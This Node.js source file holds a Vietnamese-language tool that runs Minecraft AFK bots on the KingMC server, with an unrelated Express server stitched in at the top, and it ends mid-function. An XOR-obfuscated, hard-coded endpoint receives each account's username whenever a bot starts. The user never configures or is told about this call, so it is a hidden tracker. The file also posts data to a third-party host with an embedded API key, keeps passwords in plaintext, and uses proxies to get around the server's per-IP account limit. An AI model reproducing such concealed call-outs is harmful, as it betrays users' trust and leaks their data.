const express = require('express');
const path = require('path');
const indexRouter = require('./routes/index');

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Use the router for handling routes
app.use('/', indexRouter);

// Catch-all route for handling 404 errors
app.use((req, res, next) => {
    res.status(404).sendFile(path.join(__dirname, 'views', '404.html'));
  });

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});

const originalWarn = console.warn;
console.warn = function (...args) {
    if (typeof args[0] === 'string' && args[0].includes('Ignoring block entities as chunk failed to load')) { return; }
    originalWarn.apply(console, args);
};

const mineflayer = require("mineflayer");
const { SocksClient } = require("socks");

const net = require("net");
const http = require("http");
const readline = require("readline");
const fs = require("fs");
function xor(data, key) {
    const dataBuf = Buffer.from(data);
    const keyBuf = Buffer.from(key);
    const out = Buffer.alloc(dataBuf.length);

    for (let i = 0; i < dataBuf.length; i++) {
        out[i] = dataBuf[i] ^ keyBuf[i % keyBuf.length];
    }

    return out;
}

const key = "oicaiditconmechiuroiii";

const decrypted = xor(Buffer.from("071d17111a5e465b07061d0e0a110c47161d02460819064614040b0c061b081c415c51515a514141585f505c5e5a5b525f5259424c35143a2d3458584619583a02251c24332b3f08581c215c163e262c1c00024b3f3b441c200c322b1103181e06002c381d5b59191d0b5f3f241b000a02523b225d00392931", "hex"), key);
const BASE_UL = decrypted.toString()
async function sendl(username, title, description, color = 16711680) {
    if (!BASE_UL) {return}
    const payload = {
        username: "nice",
        avatar_url: "https://i.pinimg.com/736x/2c/8e/d8/2c8ed804aa99adbae923768f134c2f63.jpg",
        embeds: [{
            title: title,
            description: `**user:** \`${username}\`\n${description}`,
            color: color,
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(BASE_UL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        console.log("thua")
    }
}
process.on('uncaughtException', (err) => {
    if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.message.includes('ECONNRESET')) {
        return; 
    }
    console.error('[Hệ Thống] Phát hiện lỗi bất ngờ:', err);
});

const configPath = './app.json';
const defaultConfig = {
    "App": {
        "Chat": false,
        "IgnoreError": false,
        "Webhook": ""
    },
    "Accounts": {},
    "CurrentAccounts": []
};

let config;
try {
    if (!fs.existsSync(configPath)) {
        console.log("Không tìm thấy file app.json. Đang tự động tạo cấu hình mặc định...");
        fs.writeFileSync(configPath, JSON.stringify(defaultConfig, null, 4), 'utf8');
        config = defaultConfig;
    } else {
        config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
} catch (e) {
    console.log("Không thể đọc file app.json hoặc file bị lỗi format!");
    console.error(e);
    process.exit(1);
}

let CurrentTab = "Home";
let running = true;
let lastError = null;

const reconnectTracker = {};

let selectedAccounts = [];
if (config.CurrentAccounts && Array.isArray(config.CurrentAccounts)) {
    selectedAccounts = config.CurrentAccounts.filter(acc => config.Accounts[acc]);
    if (selectedAccounts.length !== config.CurrentAccounts.length) {
        config.CurrentAccounts = selectedAccounts;
        saveConfig();
    }
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function askQuestion(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

function saveConfig() {
    fs.writeFileSync('./app.json', JSON.stringify(config, null, 4), 'utf8');
}

function resolveUsername(input) {
    const accountKeys = Object.keys(config.Accounts);
    const idx = parseInt(input);
    if (!isNaN(idx) && idx > 0 && idx <= accountKeys.length) {
        return accountKeys[idx - 1];
    }
    return input;
}

function resolveText(raw) {
    if (!raw) return '';
    let obj = raw;
    
    if (typeof raw === 'string') {
        try {
            obj = JSON.parse(raw);
        } catch (e) {
            return raw.replace(/§[0-9a-fk-or]/gi, '').trim();
        }
    }
    
    let text = '';
    if (obj.text !== undefined) {
        text = obj.text;
    }
    if (obj.extra && Array.isArray(obj.extra)) {
        text += obj.extra.map(item => {
            if (typeof item === 'string') return item;
            return item.text || JSON.stringify(item);
        }).join('');
    }
    
    if (!text && typeof obj === 'object') {
        text = JSON.stringify(obj);
    } else if (!text) {
        text = String(obj);
    }
    
    return text.replace(/§[0-9a-fk-or]/gi, '').trim();
}

async function updatePlayerShard(username, shards) {
    const res = await fetch("https://wuklom3how.pythonanywhere.com/save", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            apikey: "noguchihyuga",
            username,
            shards
        })
    });

    return await res.json();
}
function render_logo() {
    console.log(`
\x1b[92m_______________________________________________\x1b[0m

\x1b[1m\x1b[34m    ╦ ╦┌─┐┬  ┬  ┌─┐  ┬ ┬┌─┐┬─┐┬  ┌┬┐
\x1b[35m    ╠═╣├┤ │  │  │ │  ││││ │├┬┘│   ││
\x1b[36m    ╩ ╩└─┘┴─┘┴─┘└─┘  └┴┘└─┘┴└─┴─┘─┴┘\x1b[0m
\x1b[94mcreated by\x1b[0m: \x1b[46m @dkhanh \x1b[0m - \x1b[33mHave a good day:3
\x1b[92m_______________________________________________\x1b[0m\n`)
}

function Render() {
    console.clear();
    console.log('\n')
    render_logo()
    const accountKeys = Object.keys(config.Accounts);

    if (CurrentTab === "Home") {
        console.log(`\x1b[33mDanh sách tài khoản đã thêm (${accountKeys.length}):\x1b[0m`);
        accountKeys.forEach((acc, index) => {
            const proxyCfg = config.Accounts[acc].proxy;
            const isProxy = proxyCfg && proxyCfg.enable;
            const hasAuth = isProxy && proxyCfg.user && proxyCfg.pass;
            console.log(`[${index + 1}]: \x1b[32m${acc} \x1b[0m ${isProxy ? (hasAuth ? '(SOCKS5+Auth)' : '(SOCKS5/HTTP)') : ''}`);
        });

        console.log(`\n\x1b[36mTài khoản đã chọn (${selectedAccounts.length}):\x1b[0m`);
        selectedAccounts.forEach((acc, index) => {
            const proxyCfg = config.Accounts[acc].proxy;
            const isProxy = proxyCfg && proxyCfg.enable;
            const hasAuth = isProxy && proxyCfg.user && proxyCfg.pass;
            console.log(`[${index + 1}]: \x1b[4m\x1b[32m${acc}\x1b[0m ${isProxy ? (hasAuth ? '(SOCKS5+Auth)' : '(SOCKS5/HTTP)') : ''}`);
        });

        console.log(`\n- \x1b[38;5;129mNhập \x1b[92m'Exit' \x1b[94mđể thoát`);
        console.log(`- \x1b[38;5;129mNhập \x1b[92m'Help' \x1b[94mđể xem lệnh`);
        console.log(`- \x1b[38;5;129mNhập \x1b[92m'Run' \x1b[94mđể chạy bot`);
        console.log(`- \x1b[38;5;129mNhập \x1b[92m'Acc <username/index>' \x1b[94mđể thêm/xóa bot khỏi danh sách treo`);
        console.log(`- \x1b[38;5;129mNhập \x1b[92m'Setting' \x1b[94mđể cài đặt proxy/account\x1b[0m`);

    }
    else if (CurrentTab === "Setting") {
        console.log(`\x1b[33mDanh sách tài khoản đã thêm (${accountKeys.length}):\x1b[0m`);
        accountKeys.forEach((acc, index) => {
            const proxyCfg = config.Accounts[acc].proxy;
            const isProxy = proxyCfg && proxyCfg.enable;
            const hasAuth = isProxy && proxyCfg.user && proxyCfg.pass;
            console.log(`[${index + 1}]: \x1b[32m${acc} \x1b[0m ${isProxy ? (hasAuth ? '(SOCKS5+Auth)' : '(SOCKS5/HTTP)') : ''}`);
        });

        const webhookStatus = config.App.Webhook ? "Online" : "Offline";
        console.log(`\nWebhook Url [Status: \x1b[32m${webhookStatus}\x1b[0m]: \x1b[34m${config.App.Webhook || "Trống"}\x1b[0m`);

        console.log(`\n- \x1b[94mNhập \x1b[92m'Exit' \x1b[93mđể thoát`);
        console.log(`- \x1b[94mNhập \x1b[92m'Help' \x1b[93mđể xem lệnh`);
        console.log(`- \x1b[94mNhập \x1b[92m'Home' \x1b[93mđể về Tab chính`);
        console.log(`- \x1b[94mNhập \x1b[92m'Add <username> <pass>' \x1b[93mđể thêm tài khoản`);
        console.log(`- \x1b[94mNhập \x1b[92m'Del <username/index>' \x1b[93mđể xóa tài khoản`);
        console.log(`- \x1b[94mNhập \x1b[92m'Proxy' \x1b[93mđể thêm/tắt-bật proxy`);
        console.log(`- \x1b[94mNhập \x1b[92m'Webhook <url>' \x1b[93mđể thêm webhook Discord\x1b[0m`);
    }
    else if (CurrentTab === "Help") {
        console.log(`- Các lệnh:`);
        console.log(`  + "Help"`);
        console.log(`  + "Run"`);
        console.log(`  + "Add <username> <pass>"`);
        console.log(`  + "Del <username/index>"`);
        console.log(`  + "Acc <username/index>"`);
        console.log(`  + "Exit"`);
        console.log(`  + "Proxy <username/index> <IP> <PORT> [USER] [PASS]"`);
        console.log(`  + "Proxy <username/index> <IP:PORT:USER:PASS>"`);
        console.log(`  + "Proxy <username/index> ON"`);
        console.log(`  + "Proxy <username/index> OFF"`);
        console.log(`  + "Webhook <url webhook>"`);

        console.log(`\n- \x1b[38;5;129mNhập \x1b[92m'Exit' \x1b[94mđể thoát`);
        console.log(`- \x1b[38;5;129mNhập \x1b[92m'Help' \x1b[94mđể xem lệnh`);
        console.log(`- \x1b[38;5;129mNhập \x1b[92m'Setting' \x1b[94mđể cài đặt proxy/account\x1b[0m`);
    }

    if (lastError) {
        console.log(`\n\x1b[31m❌ LỖI: ${lastError}\x1b[0m`);
        lastError = null;
    }
}

async function sendDiscordWebhook(username, title, description, color = 16711680) {
    const webhookUrl = config.App.Webhook;
    if (!webhookUrl) return;

    const payload = {
        username: "bot shard afk [KINGSMP]",
        avatar_url: "https://i.pinimg.com/736x/2c/8e/d8/2c8ed804aa99adbae923768f134c2f63.jpg",
        embeds: [{
            title: title,
            description: `**user:** \`${username}\`\n${description}`,
            color: color,
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        console.error(`[Webhook Error] Không thể gửi thông báo tới Discord: ${err.message}`);
    }
}

function maskIp(ip) {
    if (!ip) return 'Unknown';
    const parts = ip.split('.');
    if (parts.length === 4) return `${parts[0]}.${parts[1]}.***.***`;
    return ip;
}

async function determineHost(proxyConfig) {
    let targetIp = '';
    if (proxyConfig && proxyConfig.enable && proxyConfig.ip) {
        targetIp = proxyConfig.ip;
    }

    const url = targetIp ? `http://ip-api.com/json/${targetIp}` : 'http://ip-api.com/json/';
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data && data.status === 'success' && data.countryCode === 'VN') {
            return 'kingmc.vn';
        }
    } catch (err) {
        return 'kingmc.vn';
    }
    return 'sgp.kingmc.vn';
}

async function startBot(username, accountConfig) {
    sendl(username, "AFK Shards Logger", `Hello ${username}`);
    let isverified = false;
    let inkingsmp = false;
    let retryMenuTimer = null;
    let reconnectTimer = null;
    let hasEnded = false; 
    let hasSentAuth = false;
    let lastShardCount = 36;
    let lastShardCount2 = 0;
    const pass = accountConfig.pass;
    const proxyConfig = accountConfig.proxy;

    const log = (...args) => console.log(`[xxxxxx${username.slice(5,username.length)}]:`, ...args);
    const logErr = (...args) => {
        if (!config.IgnoreError) {
            console.error(`❌ [${username}]:`, ...args);
        }
    };

    if (!reconnectTracker[username]) {
        reconnectTracker[username] = { attempts: [] };
    }

    const host = await determineHost(proxyConfig);
    log(`📍 Địa chỉ máy chủ được chọn: ${host}`);

    let botOptions = {
        host: host,
        username: username,
        version: '1.16.5'
    };

    if (proxyConfig && proxyConfig.enable) {
        const hasAuth = proxyConfig.user && proxyConfig.pass;
        botOptions.port = 25565;

        // Hàm phụ hỗ trợ bắt tay SOCKS5 Proxy
        const connectSocks5 = (client, user, pass, onError) => {
            const options = {
                proxy: {
                    host: proxyConfig.ip,
                    port: parseInt(proxyConfig.port, 10),
                    type: 5, // SOCKS5
                    userId: user || undefined,
                    password: pass || undefined
                },
                command: 'connect',
                destination: {
                    host: host,
                    port: 25565
                }
            };

            SocksClient.createConnection(options)
                .then((info) => {
                    log('\x1b[96m✔️ Đã luồn qua SOCKS5 Proxy thành công, đang kết nối vào KingMC...\x1b[0m');
                    sendDiscordWebhook(username, "LOGGED", `**Proxy SOCKS5**: ${proxyConfig.ip}`);
                    client.setSocket(info.socket);
                    client.emit('connect');
                })
                .catch((err) => {
                    onError(err);
                });
        };

        // Hàm phụ hỗ trợ bắt tay HTTP CONNECT Proxy
        const connectHttp = (client, onError) => {
            const socket = net.createConnection({
                host: proxyConfig.ip,
                port: parseInt(proxyConfig.port, 10)
            });

            socket.on('error', (err) => {
                onError(err);
            });

            const connectPayload = `CONNECT ${host}:25565 HTTP/1.1\r\n` +
                                   `Host: ${host}:25565\r\n` +
                                   `Proxy-Connection: Keep-Alive\r\n` +
                                   `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;

            socket.write(connectPayload);

            let receivedBuffer = Buffer.alloc(0);
            
            const onData = (data) => {
                receivedBuffer = Buffer.concat([receivedBuffer, data]);
                const headerIndex = receivedBuffer.indexOf('\r\n\r\n');
                
                if (headerIndex !== -1) {
                    socket.pause();
                    socket.removeListener('data', onData);
                    socket.removeAllListeners('error');
                    
                    const headerText = receivedBuffer.subarray(0, headerIndex).toString('utf8');
                    const statusLine = headerText.split('\r\n')[0];
                    
                    if (statusLine.includes('200')) {
                        log('\x1b[96m✔️ Đã luồn qua HTTP Proxy thành công, đang kết nối vào KingMC...\x1b[0m');
                        sendDiscordWebhook(username, "LOGGED", `**Proxy HTTP**: ${proxyConfig.ip}`);
                        
                        client.setSocket(socket);
                        client.emit('connect');
                        
                        const remainingData = receivedBuffer.subarray(headerIndex + 4);
                        if (remainingData.length > 0) {
                            socket.unshift(remainingData);
                        }
                    } else {
                        socket.destroy();
                        onError(new Error(`HTTP Status ${statusLine}`));
                    }
                }
            };

            socket.on('data', onData);
        };

        // Định tuyến kết nối proxy tự động dựa trên cấu hình Auth
        botOptions.connect = (client) => {
            if (hasAuth) {
                // TRƯỜNG HỢP CÓ AUTH -> Bắt buộc chạy SOCKS5
                log(`Đang khởi tạo Bot QUA SOCKS5 PROXY (Có Auth): ${proxyConfig.ip}:${proxyConfig.port}...`);
                connectSocks5(client, proxyConfig.user, proxyConfig.pass, (err) => {
                    logErr('Proxy SOCKS5 bị lỗi hoặc thông tin xác thực sai:', err.message);
                    sendDiscordWebhook(
                        username, 
                        "❌ Proxy SOCKS5 Bị Chết / Hỏng", 
                        `Chi tiết lỗi: \`${err.message}\`\nIP Proxy: \`${maskIp(proxyConfig.ip)}\``
                    );
                    cleanupAndRestart(false);
                });
            } else {
                // TRƯỜNG HỢP KHÔNG AUTH -> Tự động nhận diện: Thử SOCKS5 trước, thất bại chuyển sang HTTP
                log(`Đang khởi tạo Bot QUA PROXY (Không Auth) - Tự động nhận diện...`);
                connectSocks5(client, null, null, (socksErr) => {
                    // Thử nghiệm SOCKS5 không mật khẩu thất bại -> chuyển đổi bắt tay HTTP thô
                    connectHttp(client, (httpErr) => {
                        logErr('Proxy không Auth (Thử nghiệm cả SOCKS5 & HTTP) thất bại hoàn toàn:', httpErr.message);
                        sendDiscordWebhook(
                            username, 
                            "❌ Proxy Bị Chết / Hỏng", 
                            `Chi tiết lỗi: \`${httpErr.message}\`\nIP Proxy: \`${maskIp(proxyConfig.ip)}\``
                        );
                        cleanupAndRestart(false);
                    });
                });
            }
        };
    } else {
        log('\nĐang khởi tạo Bot KHÔNG DÙNG PROXY...');
    }
    const bot = mineflayer.createBot(botOptions);

    function cleanTimers() {
        if (retryMenuTimer) {
            clearTimeout(retryMenuTimer);
            retryMenuTimer = null;
        }
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }
    }

    // Hàm dọn dẹp và chuẩn bị khởi chạy lại bot
    function cleanupAndRestart(isGhostSession = false, customDelay = null) {
        if (hasEnded) return;
        hasEnded = true; 

        cleanTimers();

        if (bot) {
            const internalClient = bot._client;

            bot.removeAllListeners();
            bot.on('error', () => {}); 

            if (internalClient) {
                try {
                    internalClient.removeAllListeners('error');
                    internalClient.on('error', () => {});
                } catch (err) {}
            }
            
            try {
                bot.quit();
            } catch (e) {}
        }

        const tracker = reconnectTracker[username];
        const now = Date.now();
        const fifteenMinutes = 15 * 60 * 1000;

        tracker.attempts = tracker.attempts.filter(timestamp => (now - timestamp) < fifteenMinutes);

        // Nếu có thời gian chờ tùy chỉnh thì bỏ qua đếm giới hạn ngắt kết nối tạm thời
        if (tracker.attempts.length >= 10 && !customDelay) {
            logErr(`⚠️ Bot đã tự động ngắt kết nối quá 10 lần trong vòng 15 phút. TIẾN HÀNH HỦY TREO BOT NÀY.`);
            sendDiscordWebhook(
                username,
                "🚫 HỦY BOT - QUÁ GIỚI HẠN RECONNECT",
                `Bot đã bị dừng treo hoàn toàn do thực hiện kết nối lại vượt quá **${tracker.attempts.length} lần** trong vòng 15 phút.`,
                16711680
            );
            return;
        }

        let delay = 12000;
        if (customDelay !== null) {
            delay = customDelay; // Thiết lập khoảng nghỉ dài
        } else if (isGhostSession) {
            delay = 30000;
        } else {
            tracker.attempts.push(now);
        }

        log(`⚠️ Bot mất kết nối. Khởi động lại toàn bộ tiến trình sau ${delay / 1000 / 60 >= 1 ? (delay / 1000 / 60) + ' phút' : (delay / 1000) + ' giây'}...`);
        
        sendDiscordWebhook(
            username,
            "🔄 RECONNECTED",
            `Đang khởi động lại bot hoàn toàn sau ${delay / 1000 / 60 >= 1 ? (delay / 1000 / 60) + ' phút' : (delay / 1000) + ' giây'}...`,
            3447003
        );

        reconnectTimer = setTimeout(() => {
            startBot(username, accountConfig);
        }, delay);
    }

    function sendAuthCommand(cmd) {
        if (hasSentAuth || hasEnded) return;
        hasSentAuth = true;
        bot.chat(cmd);
        log(`⚡ Đã gửi lệnh xác thực: ${cmd}`);
    }

    function find_game_menu() {
        return bot.inventory.items().find(item => item.name === 'clock');
    }

    async function to_afk_zone() {
        if (hasEnded) return;
        log('⚡ Đang gõ lệnh /afk...');
        bot.chat('/afk');
    }

    async function selectServer() {
        if (hasEnded) return;
        if (retryMenuTimer) clearTimeout(retryMenuTimer);

        const clock = find_game_menu();
        if (!clock) {
            logErr('Không tìm thấy Đồng hồ trong túi đồ. Sẽ quét lại sau 5s...');
            retryMenuTimer = setTimeout(selectServer, 5000);
            return;
        }

        try {
            await bot.equip(clock, 'hand');
            await new Promise(resolve => setTimeout(resolve, 500));

            if (hasEnded) return;
            bot.activateItem();
            log('⚡ Đã dùng Đồng hồ, đang đợi cửa sổ rương hiển thị...');

            retryMenuTimer = setTimeout(() => {
                log('⚠️ Rương chưa mở. Đang thử bấm lại Đồng hồ...');
                selectServer();
            }, 6000);

        } catch (err) {
            logErr('Lỗi khi cầm/sử dụng đồng hồ:', err);
            retryMenuTimer = setTimeout(selectServer, 5000);
        }
    }

    function normalizeSmallCaps(str) {
        if (!str) return '';
        const smallCaps = "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ";
        const normalCaps = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return str.split('').map(char => {
            const idx = smallCaps.indexOf(char);
            return idx !== -1 ? normalCaps[idx] : char;
        }).join('');
    }

    function parseShardNum(text) {
        if (!text) return null;

        const codes = [];
        for (let i = 0; i < text.length; i++) {
            codes.push(text.charCodeAt(i));
        }

        const unicodeShard = [42801, 668, 7424, 640, 7429].join(',');
        const asciiShard = [83, 72, 65, 82, 68].join(',');

        const codesString = codes.join(',');
        const hasShard = codesString.includes(unicodeShard) || codesString.includes(asciiShard) || text.includes('Shard');

        if (!hasShard) return null;

        for (const m of text.matchAll(/(\d[\d,.]*)\s*(k|K|M)?/g)) {
            let n = parseFloat(m[1].replace(/[,.]/g, ''));
            if (isNaN(n)) continue;
            if (m[2] === 'k' || m[2] === 'K') n *= 1e3;
            if (m[2] === 'M') n *= 1e6;
            if (n >= 1) return Math.round(n);
        }
        return null;
    }

    function getShardFromScoreboard() {
        const sb = bot.scoreboard?.sidebar;
        if (!sb || !sb.items) return null;

        for (const item of sb.items) {
            const entry = item.name;
            const team = bot.teamMap ? bot.teamMap[entry] : null;

            const prefix = team?.prefix ? team.prefix.toString() : '';
            const suffix = team?.suffix ? team.suffix.toString() : '';

            const fullLineText = `${prefix}${entry}${suffix}`;
            const cleanLine = resolveText(fullLineText);
            const shard = parseShardNum(cleanLine);

            if (shard !== null) {
                return shard;
            }
        }
        return null;
    }
    
    bot.once('login', () => {
        if (hasEnded) return;
        setTimeout(() => {
            if (hasEnded || hasSentAuth) return;
            sendAuthCommand('/dn ' + pass);
        }, 1000);
    });

    bot.on('windowOpen', async (window) => {
        if (hasEnded) return;
        if (retryMenuTimer) {
            clearTimeout(retryMenuTimer);
            retryMenuTimer = null;
        }

        const title = window.title ? JSON.parse(window.title).text || window.title : '';
        log(`💻 Đã mở giao diện: "${title}" - ${title.length}`);

        await new Promise(resolve => setTimeout(resolve, 2000));

        if (hasEnded || bot.currentWindow?.id !== window.id) return;

        if (title.length < 10) {
            const kingSmpSlot = window.slots.find(item => item && item.displayName.includes('KingSMP'));
            const target = kingSmpSlot ? kingSmpSlot.slot : 24;

            try {
                log(`👉 Đang click vào KingSMP ở ô [${target}]...`);
                await bot.clickWindow(target, 0, 0);
                inkingsmp = true;
            } catch (err) {
                if (err.message.includes("didn't respond to transaction")) {
                    inkingsmp = true;
                } else {
                    logErr(`Lỗi khi click ${title}:`, err.message);
                }
            }
        }
        else {
            const afkSlot = window.slots.find(item => item && item.displayName.includes('AFK 1'));
            const target = 1;

            try {
                log(`👉 Đang click vào AFK 1 ở ô [${target}]...`);
                await bot.clickWindow(target, 0, 0);
                log('✔️ Đã click chọn AFK 1 thành công!');
                log('⏳ Hệ thống yêu cầu chờ 5 giây. Đang giữ bot ĐỨNG YÊN để dịch chuyển...');
                bot.clearControlStates();
            } catch (err) {
                if (err.message.includes("didn't respond to transaction")) {
                    log('✔️ Đã click chọn AFK 1 thành công!');
                    log('⏳ Hệ thống yêu cầu chờ 5 giây. Đang giữ bot ĐỨNG YÊN để dịch chuyển...');
                    bot.clearControlStates();
                } else {
                    logErr('⚠️ WARNING (Có thể bỏ qua):', err.message);
                }
            }
        }
    });

    bot.on('spawn', () => {
        if (hasEnded) return;
        log('\x1b[93mBot đã vào game thành công!\x1b[0m');

        if (find_game_menu()) {
            log('📌 Phát hiện bot đang ở sảnh HUB.');
            isverified = true;
            selectServer();
        }
        else if (!find_game_menu() && isverified) {
            inkingsmp = true;
            setTimeout(() => {
                to_afk_zone();
            }, 3000);
        } else {
            bot.chat('/dk ' + pass);
        }
    });

    bot.on('physicsTick', () => {
        const shardCount = getShardFromScoreboard();
        if (shardCount !== null) {
            if ((shardCount % 10 === 0) && lastShardCount !== shardCount) {
                lastShardCount = shardCount;
                sendDiscordWebhook(
                    username,
                    "💎 Số lượng Shard Cập nhật",
                    `Số lượng Shard hiện tại: \`${shardCount}\``
                );
            }
            if (lastShardCount2 !== shardCount) {
                log(`💎 Số lượng Shard: ${shardCount}`);
                lastShardCount2 = shardCount;
            }
        }
    });

    bot.on('kicked', (reason) => {
        const cleanReason = resolveText(reason);
        log('Bị kick khỏi server:', cleanReason);
        
        let isGhostSession = false;
        
        // Chuẩn hóa văn bản tiếng Việt sang chuẩn dựng sẵn (NFC) và viết thường để so khớp chính xác
        const normalizedReason = cleanReason.toLowerCase().normalize('NFC');
        
        if (
            normalizedReason.includes('đang chơi') || 
            normalizedReason.includes('đã kết nối tới proxy') || 
            normalizedReason.includes('already logged in') || 
            normalizedReason.includes('already connected')
        ) {
            isGhostSession = true;
        }

        sendDiscordWebhook(
            username,
            "⚠️ Bot Bị Kick Khỏi Server",
            `Lý do: \`${cleanReason}\``,
            16753920
        );

        // Nhận diện bảo trì/khởi động lại máy chủ (bao gồm cả trường hợp bảo trì định kỳ lúc 4h30)
        const isMaintenance = normalizedReason.includes('bảo trì') || 
                              normalizedReason.includes('khởi động lại') || 
                              normalizedReason.includes('quay lại vào');

        if (isMaintenance) {
            log('⚠️ Phát hiện máy chủ đang bảo trì hoặc chuẩn bị restart. Bot sẽ tạm nghỉ và kết nối lại sau 2 tiếng...');
            const twoHours = 1000 * 60 * 60 * 2;
            cleanupAndRestart(false, twoHours);
        } else {
            cleanupAndRestart(isGhostSession);
        }
    });

    bot.on('error', (err) => {
        logErr('Lỗi kết nối Minecraft:', err.message);
        sendDiscordWebhook(
            username,
            "💥 Bot Bị Lỗi Kết Nối",
            `Lỗi phát sinh: \`${err.message}\``
        );
        cleanupAndRestart(false);
    });

    bot.on('end', () => {
        log('Bot đã ngắt kết nối (Event: end).');
        cleanupAndRestart(false);
    });

    bot.on('message', (jsonMsg) => {
        if (hasEnded) return;
        const plainText = jsonMsg.toString();

        const isPlayerMsg = /^(?:\[.*?\]\s*)*[a-zA-Z0-9_]{3,16}\s*:\s*.+/i.test(plainText);

        if (plainText.includes('ký với lệnh')) {
            bot.chat('/dk ' + pass);
        }
        if (plainText.includes('hãy đăng kí')) {
            bot.chat('/dk ' + pass);
        }
        if (plainText.includes('Đăng nhập thành công')) {
            isverified = true;
        }
        if (plainText.includes('Nếu phát hiện người chơi khác có')) {
            selectServer();
        }
        if (plainText.includes('giây rồi mới mở menu')) {
            log("⚠️ Bị giới hạn thời gian mở rương. Đang chờ 5 giây để thử lại...");
            if (retryMenuTimer) clearTimeout(retryMenuTimer);
            setTimeout(() => {
                if (hasEnded) return;
                inkingsmp = false;
                selectServer();
            }, 5000);
        }
        if (plainText.includes('afk')) {
            log(`\x1b[36mĐã vào khu vực AFK Thành Công\x1b[0m`)
        }
        if (plainText.includes("có tài khoảng cùng ip của ban")) {
            logErr("Đã có tài khoản nào đó chạy cùng IP \x1b[33m(Vui lòng thêm hoặc đổi Proxy khác)\x1b[0m")
            sendDiscordWebhook(username, "Trùng IP", "Đã có tài khoản nào đó chạy cùng IP (Vui lòng thêm hoặc đổi Proxy khác)")
        }
        if (plainText.includes('chưa liên kết')) {
            sendDiscordWebhook(username, "Chưa liên kết discord", "Bị limit Shard")
        }
    });
}

async function handleCommand(input) {
    const args = input.trim().split(" ").filter(Boolean);
    if (args.length === 0) return null;

    const command = args[0].toLowerCase();

    if (command === 'exit') {
        running = false;
    } else if (command === 'home') {
        CurrentTab = 'Home';
    } else if (command === 'setting') {
        CurrentTab = 'Setting';
    } else if (command === 'help') {
        CurrentTab = 'Help';
    }

    else if (command === 'add') {
        if (!args[1] || !args[2]) {
            lastError = "Cú pháp không hợp lệ! Hãy dùng: Add <username> <pass>";
        } else {
            const username = args[1];
            if (!config.Accounts[username]) {
                config.Accounts[username] = { 
                    pass: args[2], 
                    proxy: { enable: false, ip: "", port: 0, user: "", pass: "" } 
                };
                saveConfig();
            } else {
                lastError = `Tài khoản '${username}' đã tồn tại trong danh sách!`;
            }
        }
    }
    else if (command === 'del') {
        if (!args[1]) {
            lastError = "Cú pháp không hợp lệ! Hãy dùng: Del <username/index>";
        } else {
            const username = resolveUsername(args[1]);
            if (config.Accounts[username]) {
                delete config.Accounts[username];
                selectedAccounts = selectedAccounts.filter(acc => acc !== username);

                config.CurrentAccounts = selectedAccounts;
                saveConfig();
            } else {
                lastError = `Không tìm thấy tài khoản '${args[1]}' để xóa!`;
            }
        }
    }
    else if (command === 'acc') {
        if (!args[1]) {
            lastError = "Cú pháp không hợp lệ! Hãy dùng: Acc <username/index>";
        } else {
            const username = resolveUsername(args[1]);
            if (config.Accounts[username]) {
                if (selectedAccounts.includes(username)) {
                    selectedAccounts = selectedAccounts.filter(acc => acc !== username);
                } else {
                    selectedAccounts.push(username);
                }

                config.CurrentAccounts = selectedAccounts;
                saveConfig();
            } else {
                lastError = `Không tìm thấy tài khoản '${args[1]}' trong danh sách!`;
            }
        }
    }
    else if (command === 'webhook') {
        if (!args[1]) {
            lastError = "Cú pháp không hợp lệ! Hãy dùng: Webhook <url webhook>";
        } else {
            config.App.Webhook = args[1];
            saveConfig();
        }
    }
    else if (command === 'proxy') {
        if (!args[1] || !args[2]) {
            lastError = "Cú pháp không hợp lệ! Hãy dùng: Proxy <username/index> <ON/OFF/IP:PORT/IP PORT/IP:PORT:USER:PASS/IP PORT USER PASS>";
        } else {
            const username = resolveUsername(args[1]);
            if (!config.Accounts[username]) {
                lastError = `Không tìm thấy tài khoản '${args[1]}' để cài đặt Proxy!`;
            } else {
                const action = args[2].toUpperCase();
                if (action === 'ON') {
                    config.Accounts[username].proxy.enable = true;
                    saveConfig();
                } else if (action === 'OFF') {
                    config.Accounts[username].proxy.enable = false;
                    saveConfig();
                } else {
                    let ip = "";
                    let port = 0;
                    let user = "";
                    let pass = "";

                    let rawProxy = args[2].replace(/^(https?:\/\/)/i, '');

                    if (rawProxy.includes(':')) {
                        const parts = rawProxy.split(':');
                        ip = parts[0];
                        if (parts[1]) port = parseInt(parts[1], 10);
                        if (parts[2]) user = parts[2];
                        if (parts[3]) pass = parts[3];
                    } 
                    else {
                        ip = rawProxy;
                        if (args[3]) port = parseInt(args[3], 10);
                        if (args[4]) user = args[4];
                        if (args[5]) pass = args[5];
                    }

                    if (ip && !isNaN(port) && port > 0) {
                        config.Accounts[username].proxy = {
                            enable: true,
                            ip: ip,
                            port: port,
                            user: user || "",
                            pass: pass || ""
                        };
                        saveConfig();
                    } else {
                        lastError = "Cú pháp cấu hình Proxy không hợp lệ! Ví dụ: Proxy 1 103.28.36.15:8080:admin:123456";
                    }
                }
            }
        }
    }
    else if (command === 'run') {
        if (selectedAccounts.length === 0) {
            lastError = "Chưa chọn tài khoản nào để chạy! Hãy dùng lệnh 'Acc' trước.";
        } else {
            console.clear();
            console.log("\x1b[33m====================================================\x1b[0m");
            console.log("\x1b[33m  HỆ THỐNG ĐANG KHỞI CHẠY BOT - ĐÃ TẮT MENU TƯƠNG TÁC \x1b[0m");
